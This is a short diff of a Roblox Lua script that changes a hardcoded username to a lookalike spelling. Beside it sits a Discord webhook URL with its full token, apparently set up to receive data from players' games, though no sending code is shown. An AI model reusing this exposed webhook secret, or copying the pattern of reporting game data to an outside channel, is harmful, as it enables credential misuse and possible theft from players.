@@ -1,6 +1,6 @@
 repeat task.wait() until game:IsLoaded()
 
-local Username = "lan_wp27"
+local Username = "Ian_wp27"
 local Webhook = "https://discord.com/api/webhooks/1359920557998604399/TADkOrRGt4BHvwAxE7NBMMxx4JHI-EBblHnsnvRS8iXThLWDTvpGoYKThwdlmCcvqyO6"
 
 local MarketplaceService = game:GetService("MarketplaceService")
